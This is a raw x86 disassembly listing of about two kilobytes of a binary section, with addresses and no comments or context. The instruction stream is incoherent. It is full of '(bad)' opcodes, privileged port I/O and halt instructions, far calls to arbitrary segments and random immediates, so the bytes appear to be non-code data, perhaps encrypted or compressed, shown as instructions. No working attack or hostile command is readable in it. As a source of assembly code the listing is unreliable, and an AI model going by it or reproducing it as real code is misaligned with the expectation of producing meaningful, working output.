  416295:	mov    ebp,0x1903d94
  41629a:	scas   eax,DWORD PTR es:[edi]
  41629b:	mov    eax,ds:0x99e3632c
  4162a0:	test   BYTE PTR [esi+0x3a],bl
  4162a3:	das    
  4162a4:	(bad)  
  4162a5:	lods   al,BYTE PTR ds:[esi]
  4162a6:	dec    edx
  4162a7:	or     al,0x8d
  4162a9:	xor    bl,BYTE PTR [esi]
  4162ab:	leave  
  4162ac:	mov    edx,0x804f6aba
  4162b1:	mov    al,0xb3
  4162b3:	fs adc eax,0x1adee669
  4162b9:	stos   BYTE PTR es:[edi],al
  4162ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162bb:	pusha  
  4162bc:	jge    0x4162b9
  4162be:	push   ds
  4162bf:	out    dx,al
  4162c0:	sbb    DWORD PTR [esi+0x55],esp
  4162c3:	loop   0x4162a2
  4162c5:	mov    DWORD PTR [edi+ebp*8+0x4b],eax
  4162c9:	retf   0xc05
  4162cc:	nop
  4162cd:	in     eax,0x50
  4162cf:	adc    esp,DWORD PTR [ebx]
  4162d1:	sbb    al,0xa2
  4162d3:	scas   eax,DWORD PTR es:[edi]
  4162d4:	or     al,0x89
  4162d6:	and    eax,0x38872ae2
  4162db:	lods   al,BYTE PTR ds:[esi]
  4162dc:	scas   al,BYTE PTR es:[edi]
  4162dd:	push   cs
  4162de:	mul    esi
  4162e0:	std    
  4162e1:	inc    eax
  4162e2:	push   es
  4162e3:	or     ch,BYTE PTR [edi]
  4162e5:	imul   eax,edi,0xa27b6f97
  4162eb:	xchg   esp,eax
  4162ec:	and    edi,DWORD PTR [eax-0x31]
  4162ef:	hlt    
  4162f0:	cwde   
  4162f1:	dec    esi
  4162f2:	cmp    cl,BYTE PTR [ebp-0x4455749d]
  4162f8:	mov    ds:0xe448e2e9,al
  4162fd:	xchg   esp,eax
  4162fe:	push   ds
  4162ff:	inc    edx
  416300:	int    0x42
  416302:	sbb    eax,0xb51a7fb9
  416307:	cmp    dh,ah
  416309:	sub    esp,DWORD PTR [edx]
  41630b:	call   0xe1f5eb9c
  416310:	dec    esp
  416311:	and    DWORD PTR [edx-0x45],esi
  416314:	jg     0x4162c7
  416316:	xor    al,BYTE PTR [edi+0x55]
  416319:	add    DWORD PTR [edx+0x1e],esi
  41631c:	sub    bl,al
  41631e:	call   0x98f8ad97
  416323:	sub    BYTE PTR [esi-0x5cf21f68],dl
  416329:	fldcw  WORD PTR [esi-0x56c60aef]
  41632f:	jo     0x4162c9
  416331:	es jne 0x416320
  416334:	popa   
  416335:	lods   al,BYTE PTR ds:[esi]
  416336:	cmp    eax,0x50654848
  41633b:	cs jne 0x416360
  41633e:	and    eax,0x213f4006
  416343:	mov    eax,es
  416345:	mov    esi,0x33fc3809
  41634a:	pushf  
  41634b:	cmp    eax,0x43a51344
  416350:	jecxz  0x416322
  416352:	les    eax,FWORD PTR [edx+0x223e3f94]
  416358:	iret   
  416359:	pop    edi
  41635a:	jbe    0x416373
  41635c:	sbb    BYTE PTR [eax],dh
  41635e:	(bad)  
  416360:	and    ch,BYTE PTR [edi]
  416362:	out    dx,eax
  416363:	(bad)  
  416364:	cld    
  416365:	xchg   DWORD PTR [ebp-0x4c],esp
  416368:	enter  0xd0f2,0x71
  41636c:	ror    BYTE PTR [ecx-0x7355046f],1
  416372:	rcr    DWORD PTR [edx+0x70],0x8d
  416376:	sbb    dh,BYTE PTR [ecx-0x25d1451f]
  41637c:	or     al,0x27
  41637e:	and    edx,DWORD PTR [edi]
  416380:	jbe    0x416348
  416382:	ss jg  0x4163d3
  416385:	test   BYTE PTR [ecx-0xece26fa],cl
  41638b:	mov    edi,0x313175c0
  416390:	xchg   edi,eax
  416391:	(bad)  
  416393:	xchg   edx,eax
  416394:	dec    esi
  416395:	les    edi,FWORD PTR [eax-0x69]
  416398:	inc    ebx
  416399:	mov    eax,ds:0x4f87349
  41639e:	outs   dx,DWORD PTR ds:[esi]
  41639f:	or     BYTE PTR ds:0x44e1df65,0x80
  4163a6:	push   0xffffffc9
  4163a8:	enter  0x66ef,0x9
  4163ac:	inc    ebx
  4163ad:	inc    ebx
  4163ae:	repnz push 0xffffff9f
  4163b1:	outs   dx,DWORD PTR ds:[esi]
  4163b2:	mov    bh,0x34
  4163b4:	or     esi,DWORD PTR [eax+0x62]
  4163b7:	and    DWORD PTR [eax],esp
  4163b9:	ds out dx,al
  4163bb:	and    bh,0x7b
  4163be:	ins    DWORD PTR es:[edi],dx
  4163bf:	xor    esi,0xdb40f08d
  4163c5:	mov    ebp,0x91db1d8c
  4163ca:	jne    0x416394
  4163cc:	adc    cl,BYTE PTR [edi]
  4163ce:	in     al,0xbe
  4163d0:	cwde   
  4163d1:	shl    BYTE PTR [esi-0x15],cl
  4163d4:	les    esp,FWORD PTR [edi+0x7ea4b9be]
  4163da:	and    eax,0x5e396d92
  4163df:	scas   al,BYTE PTR es:[edi]
  4163e0:	test   al,0xcc
  4163e2:	cwde   
  4163e3:	adc    al,ch
  4163e5:	cli    
  4163e6:	pop    eax
  4163e7:	jmp    0x4163ad
  4163e9:	aaa    
  4163ea:	push   ebx
  4163eb:	ins    DWORD PTR es:[edi],dx
  4163ec:	cwde   
  4163ed:	out    0x9c,eax
  4163ef:	loopne 0x41646b
  4163f1:	icebp  
  4163f2:	xor    DWORD PTR [eax],esi
  4163f4:	sub    BYTE PTR [edi+0x22332664],dh
  4163fa:	stc    
  4163fb:	cli    
  4163fc:	jbe    0x416421
  4163fe:	popf   
  4163ff:	dec    esi
  416400:	aad    0x22
  416402:	and    bh,BYTE PTR [ebp-0x5794dc2]
  416408:	jne    0x41646b
  41640a:	xchg   esp,eax
  41640b:	retf   
  41640c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41640d:	cvttps2pi mm3,QWORD PTR [esp+edi*1]
  416411:	push   edx
  416412:	cwde   
  416413:	inc    DWORD PTR [edi-0x7d]
  416416:	fsub   DWORD PTR [ebx]
  416418:	jb     0x416453
  41641a:	repz aad 0x4b
  41641d:	push   ecx
  41641e:	push   ds
  41641f:	and    eax,0xcbbd51b7
  416424:	jo     0x4163eb
  416426:	mov    cl,0xce
  416428:	dec    ebx
  416429:	xchg   ebx,eax
  41642a:	inc    esi
  41642b:	xor    ebx,DWORD PTR [edi+0x15]
  41642e:	das    
  41642f:	add    dl,BYTE PTR [ebx]
  416431:	jmp    0x40844738
  416436:	dec    edx
  416437:	rcr    DWORD PTR [esi],cl
  416439:	dec    eax
  41643a:	cmp    bh,BYTE PTR [esi]
  41643c:	popf   
  41643d:	outs   dx,DWORD PTR ds:[esi]
  41643e:	in     eax,dx
  41643f:	fimul  DWORD PTR [edi+esi*1]
  416442:	call   0xc8f580ea
  416447:	jbe    0x416462
  416449:	pop    ds
  41644a:	dec    ecx
  41644b:	lahf   
  41644c:	and    DWORD PTR [esi+0x714004ea],edx
  416452:	push   ebx
  416453:	rcr    cl,0xea
  416456:	xor    dl,BYTE PTR [eax+0x2]
  416459:	ins    DWORD PTR es:[edi],dx
  41645a:	aaa    
  41645b:	test   DWORD PTR [edi+0x37db1e12],ecx
  416461:	mov    edi,0x675bdbb
  416466:	out    dx,al
  416467:	jmp    0x416411
  416469:	push   ebx
  41646a:	cld    
  41646b:	push   esi
  41646c:	xor    eax,0x353fcb8
  416471:	bt     DWORD PTR [eax-0x12],ecx
  416475:	lds    ebp,FWORD PTR [ecx-0x51]
  416478:	imul   ecx,DWORD PTR [ebx],0xffffffb1
  41647b:	cmp    DWORD PTR [edx+0x31],edx
  41647e:	inc    esp
  41647f:	(bad)  [esi]
  416481:	scas   eax,DWORD PTR es:[edi]
  416482:	ss mov ch,0x54
  416485:	mov    cx,0x6a7d
  416489:	sub    ah,ch
  41648b:	jnp    0x41647c
  41648d:	mov    edx,0x9a570997
  416492:	and    ecx,DWORD PTR [ebp-0x5f]
  416495:	stos   DWORD PTR es:[edi],eax
  416496:	sub    eax,0x420ee847
  41649b:	and    al,0xe9
  41649d:	ins    BYTE PTR es:[edi],dx
  41649e:	(bad)  
  41649f:	dec    edx
  4164a0:	xchg   ebx,eax
  4164a1:	adc    eax,0xda85d2b3
  4164a6:	lods   al,BYTE PTR ds:[esi]
  4164a7:	shr    DWORD PTR [esi-0x6c],0x47
  4164ab:	pop    esp
  4164ac:	push   esi
  4164ad:	xchg   edx,eax
  4164ae:	inc    edi
  4164af:	mov    esp,0x2f1fc656
  4164b4:	fisubr WORD PTR [ecx]
  4164b6:	or     ebp,DWORD PTR [ecx+0x24]
  4164b9:	(bad)  
  4164ba:	cmp    al,BYTE PTR [ebp-0x6e]
  4164bd:	ins    DWORD PTR es:[edi],dx
  4164be:	lock xor ah,dh
  4164c1:	or     BYTE PTR [edx+0x770d660a],ch
  4164c7:	mov    ecx,0xebe6e50e
  4164cc:	aas    
  4164cd:	inc    eax
  4164ce:	mov    dl,BYTE PTR [esi]
  4164d0:	retf   0x869e
  4164d3:	pop    ss
  4164d4:	sbb    esi,DWORD PTR [eax+0x7c0e53]
  4164da:	cmc    
  4164db:	sahf   
  4164dc:	xchg   esi,eax
  4164dd:	mov    eax,ds:0x5dedde81
  4164e2:	call   DWORD PTR [esi-0x5]
  4164e5:	xchg   esp,eax
  4164e6:	push   esi
  4164e7:	ss mov eax,0xe0fd9127
  4164ed:	mov    eax,edx
  4164ef:	inc    ecx
  4164f0:	mov    ch,bh
  4164f2:	test   esp,eax
  4164f4:	ds pop ebx
  4164f6:	data16 add BYTE PTR [ecx+0x42325563],0xc9
  4164fe:	mov    ebx,DWORD PTR [edi+0x651c091b]
  416504:	and    cl,BYTE PTR [ecx-0x1d]
  416507:	push   cs
  416508:	add    edi,esp
  41650a:	data16 sti 
  41650c:	or     bl,0x63
  41650f:	add    DWORD PTR [esp+edi*8+0x71],ebp
  416513:	(bad)  
  416514:	xchg   ebx,eax
  416515:	sbb    al,0x83
  416517:	jns    0x416583
  416519:	xor    DWORD PTR [esi],eax
  41651b:	ror    DWORD PTR [ecx+0x790c5c0d],1
  416521:	push   ss
  416522:	inc    edx
  416523:	das    
  416524:	stc    
  416525:	mov    BYTE PTR [edi],cl
  416527:	repz jo 0x4164bd
  41652a:	ins    BYTE PTR es:[edi],dx
  41652b:	sub    eax,0x865087e8
  416530:	retf   
  416531:	retf   
  416532:	cdq    
  416533:	add    DWORD PTR [esp+edx*2],ecx
  416536:	push   0xffffffd6
  416538:	mov    DWORD PTR [ebp+eiz*8-0x64],eax
  41653c:	ja     0x416519
  41653e:	or     ch,BYTE PTR [edx-0x38]
  416541:	stos   DWORD PTR es:[edi],eax
  416542:	cmp    DWORD PTR [ebx+0x1d],esp
  416545:	dec    edi
  416546:	std    
  416547:	mov    ebp,0xed716cfa
  41654c:	mov    bl,0x8f
  41654e:	sub    bl,BYTE PTR [edi]
  416550:	out    dx,eax
  416551:	fcmovne st,st(1)
  416553:	push   0x4b
  416555:	mov    bl,0xda
  416557:	in     eax,0x73
  416559:	je     0x416510
  41655b:	mov    esi,0xc9e9cb6a
  416560:	sbb    BYTE PTR [ebp+0x35d81157],ah
  416566:	mov    ah,0xfa
  416568:	mov    BYTE PTR [esi],bh
  41656a:	iret   
  41656b:	mov    esp,DWORD PTR [edx+0x4404bed]
  416571:	sbb    eax,0xebd249c7
  416576:	inc    ebx
  416577:	sub    DWORD PTR [eax],esp
  416579:	add    BYTE PTR gs:[ebx],bl
  41657c:	lea    edx,[ebx-0x64b8f308]
  416582:	shr    BYTE PTR [eax-0xf],cl
  416585:	xor    edi,edx
  416587:	call   0xa7f5:0x4710a48a
  41658e:	dec    edx
  41658f:	lods   eax,DWORD PTR ds:[esi]
  416590:	fdivr  st(5),st
  416592:	dec    ebp
  416593:	(bad)  
  416594:	pushf  
  416595:	cmp    BYTE PTR cs:[esi+esi*4],ah
  416599:	lahf   
  41659a:	sbb    ah,BYTE PTR [edi-0x1b5df893]
  4165a0:	ins    BYTE PTR es:[edi],dx
  4165a1:	dec    edi
  4165a2:	(bad)  
  4165a3:	iret   
  4165a4:	rol    BYTE PTR [esi+esi*1+0x26],1
  4165a8:	mov    dl,0xba
  4165aa:	pop    esp
  4165ab:	sub    edx,edi
  4165ad:	cmp    al,0x5
  4165af:	pop    ss
  4165b0:	jecxz  0x41654a
  4165b2:	repz popa 
  4165b4:	push   eax
  4165b5:	ins    DWORD PTR es:[edi],dx
  4165b6:	js     0x41659b
  4165b8:	ins    DWORD PTR es:[edi],dx
  4165b9:	shl    DWORD PTR [ebx],1
  4165bb:	clc    
  4165bc:	(bad)
  4165bf:	xor    DWORD PTR [edx-0x373bddc],esi
  4165c5:	inc    ecx
  4165c6:	leave  
  4165c7:	scas   al,BYTE PTR es:[edi]
  4165c8:	pop    ecx
  4165c9:	xchg   esi,eax
  4165ca:	nop
  4165cb:	push   ss
  4165cc:	test   DWORD PTR [esi-0x4f],edx
  4165cf:	dec    DWORD PTR [edi+edi*1]
  4165d2:	cmp    al,0x87
  4165d4:	or     eax,0xe30581eb
  4165d9:	dec    ch
  4165db:	dec    esi
  4165dc:	pop    ebx
  4165dd:	mov    esp,0x6deb0004
  4165e2:	mov    edx,0x87c9e548
  4165e7:	adc    ecx,esp
  4165e9:	imul   dh
  4165eb:	jno    0x4165c5
  4165ed:	frstor [esi-0x52]
  4165f0:	in     al,0xc7
  4165f2:	pop    eax
  4165f3:	in     eax,dx
  4165f4:	and    eax,0xfccbf53f
  4165f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165fa:	mov    eax,ebx
  4165fc:	into   
  4165fd:	call   0x566a:0x3a9ac925
  416604:	xchg   esi,eax
  416605:	pop    eax
  416607:	cmp    al,0xa3
  416609:	pop    ebx
  41660a:	mov    ds:0xb50211fd,al
  41660f:	or     dh,BYTE PTR [ecx-0x4e3ba5dc]
  416615:	lods   al,BYTE PTR ds:[esi]
  416616:	push   edi
  416617:	dec    edx
  416618:	sub    al,0x39
  41661a:	jp     0x416658
  41661c:	je     0x41669b
  41661e:	mov    esi,DWORD PTR [esi+0x7427222c]
  416624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416625:	cmp    ebp,0x2e26e062
  41662b:	push   ebp
  41662c:	lds    edx,FWORD PTR [edx]
  41662e:	test   BYTE PTR [esi],dl
  416630:	pop    es
  416631:	(bad)  
  416633:	pcmpgtb mm0,QWORD PTR [eax]
  416636:	repz or ch,BYTE PTR [edx]
  416639:	adc    DWORD PTR [edx-0x6b2ff070],ebp
  41663f:	not    DWORD PTR [eax-0x5e528c83]
  416645:	je     0x4165d9
  416647:	gs jecxz 0x4166a4
  41664a:	cmp    edx,DWORD PTR [eax+0x6e2a56]
  416650:	test   DWORD PTR [ebp-0x62],edx
  416653:	add    eax,0xe32c945b
  416658:	push   ecx
  416659:	jmp    0x4166c3
  41665b:	outs   dx,DWORD PTR ds:[esi]
  41665c:	pop    ebx
  41665d:	call   FWORD PTR [eax]
  41665f:	mov    WORD PTR [ebx+0x31d0b31b],?
  416665:	leave  
  416666:	inc    eax
  416667:	sub    al,0x96
  416669:	pop    DWORD PTR [ecx]
  41666b:	pop    ebp
  41666c:	daa    
  41666d:	ss jns 0x41669e
  416670:	xor    al,0x60
  416672:	aas    
  416673:	in     al,dx
  416674:	ror    DWORD PTR [ebp-0x58b75074],1
  41667a:	and    DWORD PTR [edi-0x324f0f08],ebp
  416680:	fwait
  416681:	rcl    BYTE PTR [ebp-0x27],0x87
  416685:	inc    esi
  416686:	or     al,0x24
  416688:	or     eax,0x684d567f
  41668d:	mov    esi,0x2ce8e511
  416692:	cwde   
  416693:	(bad)
  416696:	push   esi
  416697:	mov    edi,DWORD PTR [esi+ecx*8+0x6fd6c538]
  41669e:	pop    esi
  41669f:	out    dx,eax
  4166a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166a1:	rol    BYTE PTR [ecx],0xf1
  4166a4:	fdivr  DWORD PTR [esi+0x6c]
  4166a7:	and    DWORD PTR [eax],0x5d
  4166aa:	mov    edi,0x5a7dd07a
  4166af:	sbb    al,0xae
  4166b1:	dec    ecx
  4166b2:	in     eax,dx
  4166b3:	add    cl,al
  4166b5:	xchg   edx,eax
  4166b6:	pop    edi
  4166b7:	stc    
  4166b8:	in     eax,dx
  4166b9:	ret    
  4166ba:	ds std 
  4166bc:	retf   
  4166bd:	(bad)
  4166c1:	test   DWORD PTR [edi+edx*1],eax
  4166c4:	rcl    ah,cl
  4166c6:	cs dec esp
  4166c8:	outs   dx,BYTE PTR ds:[esi]
  4166c9:	adc    eax,0xe48a22cb
  4166ce:	inc    edx
  4166cf:	stos   DWORD PTR es:[edi],eax
  4166d0:	dec    ecx
  4166d1:	push   esi
  4166d2:	pop    eax
  4166d3:	loop   0x4166f0
  4166d5:	cmp    DWORD PTR [esi+0x5c7c9385],eax
  4166db:	cmp    ah,BYTE PTR [edx+edi*1-0x52]
  4166df:	xchg   edx,eax
  4166e0:	pop    ebp
  4166e1:	stos   BYTE PTR es:[edi],al
  4166e2:	sahf   
  4166e3:	and    eax,0x59490ee
  4166e8:	or     eax,0xe7d53c2a
  4166ed:	add    BYTE PTR [edi-0x36fa6a8f],al
  4166f3:	lahf   
  4166f4:	js     0x416767
  4166f6:	(bad)  
  4166f7:	cli    
  4166f8:	stc    
  4166f9:	pop    ecx
  4166fa:	jno    0x4166be
  4166fc:	pop    edi
  4166fd:	xchg   ebp,eax
  4166fe:	fisttp DWORD PTR ds:0x26170c36
  416704:	jno    0x4166b8
  416706:	pop    ss
  416707:	arpl   WORD PTR [edx+ebp*2],bx
  41670a:	fld1   
  41670c:	fwait
  41670d:	imul   esp,esp,0x2cd4b179
  416713:	popf   
  416714:	push   edx
  416715:	imul   DWORD PTR [ebx+0x5f]
  416718:	fistp  WORD PTR [edi+0x7e]
  41671b:	addr16 rcr eax,cl
  41671e:	cmp    BYTE PTR [ebp-0x72],bh
  416721:	mov    BYTE PTR [edx+0x6801fc96],ch
  416727:	repz call 0xc90:0xa29f0fa5
  41672f:	aam    0x50
  416731:	div    DWORD PTR [eax+0x6842ff0f]
  416737:	stc    
  416738:	popa   
  416739:	mov    edx,0xc67ef0f9
  41673e:	cld    
  41673f:	add    bh,ah
  416741:	sbb    ch,ah
  416743:	xor    al,0x2d
  416745:	and    DWORD PTR [esi-0x13179c48],esi
  41674b:	pushf  
  41674c:	scas   al,BYTE PTR es:[edi]
  41674d:	and    DWORD PTR [esi-0x2a9110d1],0x41341694
  416757:	lods   al,BYTE PTR ds:[esi]
  416758:	xchg   esp,eax
  416759:	mov    DWORD PTR ds:0x5716c7e,eax
  41675f:	mov    ds:0x9f63e8f7,eax
  416764:	jae    0x416733
  416766:	mov    edi,eax
  416768:	(bad)  
  41676a:	sti    
  41676b:	das    
  41676c:	fnstsw ax
  41676e:	pop    edi
  41676f:	daa    
  416770:	add    bl,BYTE PTR [esi-0x5da6e247]
  416776:	scas   al,BYTE PTR es:[edi]
  416777:	or     esp,DWORD PTR [ebx+0x73117611]
  41677d:	popf   
  41677e:	rol    BYTE PTR [edi+0x58],0xa9
  416782:	push   esi
  416783:	sub    eax,0xce64edd1
  416788:	or     cl,BYTE PTR [ebx]
  41678a:	out    dx,al
  41678b:	das    
  41678c:	ins    DWORD PTR es:[edi],dx
  41678d:	out    dx,al
  41678e:	sub    esi,ebp
  416790:	inc    esp
  416791:	into   
  416792:	ret    
  416793:	jmp    0x4167b3
  416795:	mov    ebx,0x6d6c196d
  41679a:	mov    eax,ds:0x5b324607
  41679f:	or     ah,BYTE PTR [ebx+0x3c]
  4167a2:	xor    al,0x7f
  4167a4:	xor    eax,0x221e0784
  4167a9:	jmp    0xa1b9:0x1875bc08
  4167b0:	cmc    
  4167b1:	inc    edi
  4167b2:	(bad)  
  4167b3:	push   ss
  4167b4:	push   ebx
  4167b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167b6:	lea    edi,[ebx+0x2a]
  4167b9:	adc    DWORD PTR ds:0x1a53eaa0,esi
  4167bf:	sbb    eax,0x5e21759e
  4167c4:	sub    ch,cl
  4167c6:	mov    al,ds:0x62297c9d
  4167cb:	sar    BYTE PTR [ebp+0x7851b96c],cl
  4167d1:	test   eax,0xd8627754
  4167d6:	cmp    eax,0xa30ec4c3
  4167db:	(bad)  
  4167dd:	dec    ecx
  4167de:	fwait
  4167df:	popf   
  4167e0:	mov    ebx,0xd53dc993
  4167e5:	lea    esp,[esi+0x3e]
  4167e8:	mov    ah,0x57
  4167ea:	adc    al,0x25
  4167ec:	lock mov ah,0xa6
  4167ef:	push   esi
  4167f0:	rol    DWORD PTR [esi],cl
  4167f2:	add    al,BYTE PTR [edx]
  4167f4:	ret    
  4167f5:	add    DWORD PTR [esi],esp
  4167f7:	pop    eax
  4167f8:	and    BYTE PTR [ebp+0x708313ec],ah
  4167fe:	cdq    
  4167ff:	push   es
  416800:	mov    eax,ds:0x563b908b
  416805:	inc    esp
  416806:	arpl   sp,si
  416808:	pop    esi
  416809:	std    
  41680a:	retf   
  41680b:	sub    ebp,ebp
  41680d:	mov    al,ds:0xf2db00d
  416812:	jmp    0x46b11de8
  416817:	imul   ecx,ebp,0x2990d4d8
  41681d:	cmp    al,0x42
  41681f:	sti    
  416820:	fcmovnbe st,st(4)
  416822:	adc    eax,0x1ea9457e
  416827:	lods   al,BYTE PTR ds:[esi]
  416828:	in     eax,0x8e
  41682a:	icebp  
  41682b:	and    al,0x8a
  41682d:	call   0x7808:0x40cbe061
  416834:	pop    ecx
  416835:	jbe    0x4168ad
  416837:	xchg   edi,eax
  416838:	dec    esp
  416839:	fidivr WORD PTR [ebx-0x7e0510d6]
  41683f:	fwait
  416840:	aas    
  416841:	push   esi
  416842:	jno    0x416888
  416844:	cmp    BYTE PTR [edx-0x22],0x1
  416848:	inc    esi
  416849:	std    
  41684a:	in     al,0x23
  41684c:	mov    edx,0x7d9c774a
  416851:	dec    ecx
  416852:	jno    0x4168b6
  416854:	pop    ecx
  416855:	sbb    DWORD PTR [ebx-0x6093714],eax
  41685b:	(bad)  
  41685c:	shl    BYTE PTR [ebx-0x4393be3f],cl
  416862:	daa    
  416863:	cli    
  416864:	push   ds
  416865:	in     al,0x88
  416867:	push   eax
  416868:	mov    edi,0xde0e0f14
  41686d:	xchg   edx,eax
  41686e:	ins    BYTE PTR es:[edi],dx
  41686f:	out    0x58,al
  416871:	popa   
  416872:	mov    bl,0xf0
  416874:	mov    esp,0x94a80946
  416879:	sbb    dh,BYTE PTR [esi]
  41687b:	xlat   BYTE PTR ds:[ebx]
  41687c:	hlt    
  41687d:	aam    0x17
  41687f:	jle    0x416891
  416881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416882:	sbb    bl,cl
  416884:	push   eax
  416885:	pop    edi
  416886:	xor    al,0x21
  416888:	div    DWORD PTR [esi]
  41688a:	inc    esi
  41688b:	jb     0x41685e
  41688d:	in     eax,0xdc
  41688f:	sti    
  416890:	imul   ecx,DWORD PTR [ecx],0xb33d2a34
  416896:	adc    BYTE PTR [ebp+ebp*8+0x1d],dh
  41689a:	pop    ss
  41689b:	fwait
  41689c:	gs push ss
  41689e:	scas   al,BYTE PTR es:[edi]
  41689f:	call   0x4cbb58a2
  4168a4:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168a6:	data16 ficomp DWORD PTR [eax]
  4168a9:	call   0xd714:0x7171921a
  4168b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168b1:	lock add eax,0x745264df
  4168b7:	and    esi,edi
  4168b9:	jo     0x4168ae
  4168bb:	out    dx,eax
  4168bc:	push   ecx
  4168bd:	or     bh,BYTE PTR [ebx-0x42c26ac4]
  4168c3:	cmp    eax,0x764b2bd2
  4168c8:	fdiv   st(2),st
  4168ca:	push   esp
  4168cb:	mov    ecx,ebx
  4168cd:	test   bl,bh
  4168cf:	inc    esi
  4168d0:	dec    edi
  4168d1:	xchg   esp,eax
  4168d2:	cld    
  4168d3:	scas   al,BYTE PTR es:[edi]
  4168d4:	rcl    BYTE PTR [eax+eax*1-0x23],1
  4168d8:	aaa    
  4168d9:	out    0x5d,al
  4168db:	xor    bl,ah
  4168dd:	or     al,BYTE PTR [edx-0x71891621]
  4168e3:	daa    
  4168e4:	jo     0x4168ec
  4168e6:	(bad)  
  4168e7:	stc    
  4168e8:	inc    ebp
  4168e9:	xchg   DWORD PTR [eax-0x3f],esp
  4168ec:	pop    ebp
  4168ed:	sbb    BYTE PTR ds:0xac265997,0xc7
  4168f4:	scas   eax,DWORD PTR es:[edi]
  4168f5:	sub    dh,BYTE PTR [esi]
  4168f7:	retf   0x78a9
  4168fa:	mov    ch,0x16
  4168fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168fd:	or     BYTE PTR [edi+0x6c],ch
  416900:	mov    ebx,0x245e134c
  416905:	push   ecx
  416906:	loope  0x41692e
  416908:	imul   ebp,DWORD PTR [esi-0x73c41c08],0x0
  41690f:	xchg   ebx,eax
  416910:	stos   DWORD PTR es:[edi],eax
  416911:	add    BYTE PTR [eax-0x6],bl
  416914:	sbb    edi,DWORD PTR [edi]
  416916:	mov    esi,DWORD PTR [eax]
  416918:	aam    0x40
  41691a:	into   
  41691b:	xor    eax,0x2cc57138
  416920:	scas   eax,DWORD PTR es:[edi]
  416921:	stc    
  416922:	mov    edi,0x7e9462f7
  416927:	fistp  WORD PTR [edi+0x63edfd59]
  41692d:	nop
  41692e:	pop    esi
  41692f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416930:	lock (bad) 
  416933:	icebp  
  416934:	outs   dx,BYTE PTR ds:[esi]
  416935:	(bad)  
  416936:	xchg   ebp,eax
  416937:	sar    DWORD PTR [esi+0x3f7de3d9],0x35
  41693e:	imul   esp,DWORD PTR [edi],0x38
  416941:	fstp   TBYTE PTR [ebx*8-0x794170cd]
  416948:	dec    edx
  416949:	scas   eax,DWORD PTR es:[edi]
  41694a:	sub    ebx,ebp
  41694c:	ret    
  41694d:	out    dx,al
  41694e:	jp     0x41694a
  416950:	pop    ds
  416951:	mov    al,ds:0x3269b68e
  416956:	xchg   edi,eax
  416957:	outs   dx,DWORD PTR ds:[esi]
  416958:	add    BYTE PTR [esi+0x5e],dl
  41695b:	cdq    
  41695c:	pop    ax
  41695e:	or     DWORD PTR [edi+0x3d],0x6f
  416962:	ret    0x7dd9
  416965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416966:	mov    ch,0xe7
  416968:	xor    ah,BYTE PTR [esi+edi*8-0x50]
  41696c:	sub    edx,DWORD PTR [ebx]
  41696e:	in     al,dx
  41696f:	in     eax,dx
  416970:	std    
  416971:	mov    ch,0x6b
  416973:	test   eax,0x54997bd5
  416978:	push   ecx
  416979:	and    eax,0xd5eaea9b
  41697e:	loopne 0x416987
  416980:	(bad)  
  416981:	(bad)  [ebp-0x6]
  416984:	mov    WORD PTR [edi+0x6f0025ea],gs
  41698a:	or     esi,DWORD PTR [ebp+ebp*4-0x6a1b75f3]
  416991:	jne    0x41698b
  416993:	ret    0xe082
  416996:	cmp    al,BYTE PTR [ebp-0x3eb6a4e7]
  41699c:	in     eax,0xbf
  41699e:	add    al,BYTE PTR [eax+0x78]
  4169a1:	add    eax,0x9562fe05
  4169a6:	xchg   ebp,eax
  4169a7:	xchg   esp,eax
  4169a8:	aaa    
  4169a9:	sub    ebp,DWORD PTR [esp+edi*4]
  4169ac:	rcr    DWORD PTR [edx-0x273fe9b8],cl
  4169b2:	loope  0x416972
  4169b4:	sub    DWORD PTR [edx+ebx*8+0x4564a03e],eax
  4169bb:	test   ebp,0x1be53781
  4169c1:	les    esp,FWORD PTR [ebx+0x19]
  4169c4:	int3   
  4169c5:	xor    eax,DWORD PTR [eax]
  4169c7:	or     BYTE PTR [ebx-0x104089f8],0xab
  4169ce:	setl   BYTE PTR ds:[ebx]
  4169d2:	dec    esi
  4169d3:	mov    bl,0xa9
  4169d5:	sub    eax,ecx
  4169d7:	push   edx
  4169d8:	or     BYTE PTR [esi-0x1],0xa8
  4169dc:	and    al,0x91
  4169de:	repnz mov ebx,0x2ed19e6c
  4169e4:	sbb    DWORD PTR [ecx+0x20],edx
  4169e7:	and    esp,DWORD PTR [edi-0x3c3b3981]
  4169ed:	lock cld 
  4169ef:	xor    DWORD PTR [esp+eax*2],edi
  4169f2:	jne    0x4169aa
  4169f4:	mov    WORD PTR [eax-0xf],?
  4169f7:	pop    ebx
  4169f8:	adc    ch,BYTE PTR [eax+0x7]
  4169fb:	inc    esi
  4169fc:	jnp    0x416a51
  4169fe:	mov    es,WORD PTR [eax]
  416a00:	shl    DWORD PTR ss:[eax],cl
  416a03:	into   
  416a04:	mov    eax,0xfffaa974
  416a09:	ins    DWORD PTR es:[edi],dx
  416a0a:	add    esp,DWORD PTR [ebx-0x5e487c04]
  416a10:	push   0xc2db257
  416a15:	adc    DWORD PTR [edx+0x752535fb],0xffffffe1
  416a1c:	or     bl,ch
  416a1e:	sub    esi,DWORD PTR ds:0x24ebb2a3
  416a24:	mov    bl,0xba
  416a26:	jmp    0x416a38
  416a28:	push   ebx
  416a29:	jl     0x4169fb
  416a2b:	sub    ecx,DWORD PTR cs:[ebx-0x75]
  416a2f:	xchg   BYTE PTR [ebp-0x70d34b56],dl
  416a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a36:	loopne 0x416a85
  416a38:	dec    eax
  416a39:	shr    DWORD PTR [eax-0x20],1
  416a3c:	mov    al,ds:0x674acd45
  416a41:	outs   dx,BYTE PTR ds:[esi]
  416a42:	jo     0x416a3a
  416a44:	pop    ebx
  416a45:	or     BYTE PTR [edx+0x70cc79c7],dl
  416a4b:	in     eax,0x46
